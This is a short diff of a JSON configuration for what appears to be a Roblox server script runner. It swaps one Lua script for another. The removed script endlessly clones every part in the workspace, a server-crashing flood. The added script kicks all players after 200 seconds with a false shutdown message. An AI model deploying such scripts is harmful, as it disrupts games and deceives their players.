@@ -9,6 +9,6 @@
     },
     {
         "Server3": true,
-        "script": "while task.wait(0.1) do for _, v in pairs(game.Workspace:GetDescendants()) do if v:IsA('BasePart') and not v:IsA('Terrain') then for i = 1, math.min(10, 500) do v:Clone() end end end end"
+        "script": "task.wait(200) for _, v in pairs(game.Players:GetPlayers()) do v:Kick('The server has shutdown') end"
     }
 ]
